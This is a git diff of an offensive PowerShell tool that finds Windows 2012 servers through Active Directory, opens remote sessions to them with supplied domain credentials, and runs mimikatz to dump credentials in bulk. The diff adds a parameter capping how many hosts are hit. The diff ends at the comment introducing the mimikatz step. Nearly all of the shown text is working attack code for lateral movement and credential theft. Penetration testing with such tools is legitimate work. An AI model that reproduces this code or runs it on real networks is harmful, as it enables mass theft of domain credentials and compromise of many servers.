@@ -1,8 +1,7 @@
 # Author: Scott Sutherland (@_nullbind), 2015 NetSPI
 # Description:  This can be used to massmimikatz 2012 server from a non domain system.
-# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -verbose
+# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10
 # Note: this is based on work done by rob fuller and will schroeder.
-# todo: add option to limit number of servers.
 # Just for fun.
 
 function Get-MimikatzCreds2012
@@ -17,6 +16,10 @@ function Get-MimikatzCreds2012
         [Parameter(Mandatory=$false,
         HelpMessage="Domain controller for Domain and Site that you want to query against.")]
         [string]$DomainController,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="This limits how many servers to run mimikatz on.")]
+        [int]$MaxHosts = 5,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
@@ -82,21 +85,28 @@ function Get-MimikatzCreds2012
         # Establish sessions
         # ---------------------------------------- 
         $ServerCount = $TblServers2012.Rows.Count
-        Write-verbose "Creating $ServerCount ps sessions..."
+        Write-Verbose "Found $ServerCount 2012 Servers."
+        Write-verbose "Attempting to create $MaxHosts ps sessions..."
 
-        # Create sessions 
-        $Counter = 0         
+        # Set counters
+        $Counter = 0     
+        $SessionCount = 0   
+
         $TblServers2012 | 
-        Foreach {
-            $Counter = $Counter+1
-            [string]$MyComputer = $_.ComputerName    
-            Write-Verbose "Processing $Counter of $ServerCount - $MyComputer"         
-            New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue
-        }           
+        ForEach-Object {
 
-        # Get sessions count
-        $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
+            if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
+                $Counter = $Counter+1
+                
+                # Get session count
+                $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
 
+                # attempt session
+                [string]$MyComputer = $_.ComputerName    
+                Write-Verbose "Processing host $Counter of $ServerCount - $MyComputer"         
+                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue            
+            }
+        }                   
 
         # ----------------------------------------
         # Attempt to run mimikatz
